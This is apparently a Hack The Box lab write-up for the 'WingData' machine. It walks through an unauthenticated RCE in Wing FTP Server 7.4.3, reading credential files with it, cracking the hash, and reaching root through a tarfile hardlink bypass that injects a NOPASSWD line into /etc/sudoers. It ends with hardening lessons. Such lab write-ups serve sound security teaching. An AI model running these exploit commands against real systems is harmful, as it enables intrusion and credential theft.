# 🖥️ HTB: WIngData

**Difficulty:**  🟡Easy
**OS:** [🐧 Linux / 🪟 Windows
**IP:** `10.10.XX.XX`

---

## 📝 Executive Summary

>**WingData** is a Linux machine that demonstrates the dangers of running outdated administrative software and insecure backup scripts. The initial foothold is achieved by exploiting an **Unauthenticated Remote Code Execution (RCE)** in **Wing FTP Server 7.4.3**. After extracting a user password hash from an XML configuration file, the final escalation to root is performed by exploiting a **Python `tarfile` Hardlink/Symlink bypass (CVE-2025-4517)** to gain arbitrary file write access over the `/etc/sudoers` file.

---

## 🛠 Tools Used


- **Enumeration:** Nmap, `cat`, DNS resolution.
- **Foothold:** Python3 (Requests), CVE-2025-47812 Exploit.
- **Cracking:** Hashcat, Rockyou.txt.
- **Escalation:** Python3, `tar`, CVE-2025-4517 PoC.

---

## 🔍 Phase 1: Enumeration

### 1.1 Network Scanning

```bash
nmap -Pn 10.129.2.199
```

| PORT     | STATE | SERVICE |
| -------- | ----- | ------- |
| 22/tcp   | open  | ssh     |
| 8080/tcp | open  | http    |

### 1.2 Web Reconnaissance

We need resolution directions, modify the host list 
#technique/dns-resolution
``` bash
sudo nano /etc/hosts 
```
![[01WD_Web.png]]

---

## 🚀 Phase 2: Exploitation (User Flag)

### 2.1 Vulnerability Discovery

The target is running **Wing FTP Server 7.4.3**, which is vulnerable to an unauthenticated RCE.
- **Reference:** [Exploit-DB 52347](https://www.exploit-db.com/exploits/52347)
- **CVE:** CVE-2025-47812
### 2.2 Execution & Data Extraction

After installing the necessary dependencies, the exploit script was used to run system commands remotely.
```bash
# Install dependencies
pip install requests

# Verification of RCE
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"

# Extracting the user configuration file (contains password hash)
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c 'cat /opt/wftpserver/Data/1/users/wacky.xml' -v

# Extracting the XML in Base64 to ensure data integrity
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c 'cat /opt/wftpserver/Data/1/users/wacky.xml | base64' -v
```

### 2.3 Cracking and Intrusion

The `wacky.xml` file contained a password hash. Using the identified salt, the password was cracked via **Hashcat**.

1. **SSH Access:**

```bash
ssh wacky@10.129.2.199
# Used the cracked password to log in. 
```

```bash
cat flag.txt
```

**🚩 User Flag:** `[USER_HASH_HERE]`

---

## ⚡ Phase 3: Privilege Escalation (Root Flag)

### 3.1 Local Enumeration

A check of sudo privileges revealed a vulnerable Python restoration script:

```bash
sudo -l
# Result: (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### 3.2 Path to Root (CVE-2025-4517)

The `restore_backup_clients.py` script extracts backups using root privileges. While it implements a security filter to prevent standard path traversal, it is vulnerable to **CVE-2025-4517**, which allows a bypass using a combination of nested directories, symbolic links, and hardlinks.

1. **Exploit Strategy:** We utilized a automated PoC from the following repository: [CVE-2025-4517-POC-HTB-WingData](https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git).
    - **The Bypass:** The exploit creates a deep directory structure to confuse path resolution and uses a **Hardlink** named `sudoers_link`.
    - **The Target:** Since hardlinks share the same inode as the target file, the script extracts malicious content directly into `/etc/sudoers` when it follows the link chain.
        
2. **Execution:** The process was automated using a local Python script to ensure the complex `tar` structure was perfectly crafted.
    
```bash
# 1. Create the exploit script locally
nano exploit_final.py

# 2. Run the exploit (Automates tar creation and calls the vulnerable script)
python3 exploit_final.py
```

3. **Gaining Root:** After the script confirmed the successful injection of the line `wacky ALL=(ALL) NOPASSWD: ALL`, we spawned a root shell.

```bash
# Verify the new sudo privileges
sudo -l

# Elevate to root
sudo /bin/bash

# Retrieve the final flag
cat /root/root.txt
```


**🚩 Root Flag:** `[PEGA_AQUÍ_EL_HASH]`

---

## 📖 Lessons Learned & Tips

### 🛡️ Patch Management & Service Hardening

Always prioritize updating administrative services. The foothold was only possible because **Wing FTP Server 7.4.3** was running an unpatched version. In a production environment, implementing a strict **Patch Management Lifecycle** would have mitigated the initial RCE (CVE-2025-47812) before it could be exploited.

### 🐍 The "Filter" Fallacy in Python Security

Relying on built-in filters (like the `data` filter in Python’s `tarfile` module) isn't a silver bullet. While these filters are a step forward in preventing standard path traversal via symlinks, logic flaws involving **Hardlinks** can still be used to achieve **Arbitrary File Write**.

> **Key Takeaway:** When a script runs with `root` privileges, never trust user-supplied archives. The safest approach is to extract files into a sandbox with restricted permissions first.

### 💾 Real-World Troubleshooting: The Disk Space Trap

In many Capture The Flag (CTF) environments, a full disk (`100% Use%`) is a classic "rabbit hole." It’s a reminder that before assuming an exploit is broken, you should perform a basic system health check.

- **Pro-Tip:** Always run `df -h` if your scripts fail with "Permission Denied" or "No space left on device." Cleaning up large temporary files (like that 2.2GB `.tar`) is often the hidden key to getting your exploit to trigger.
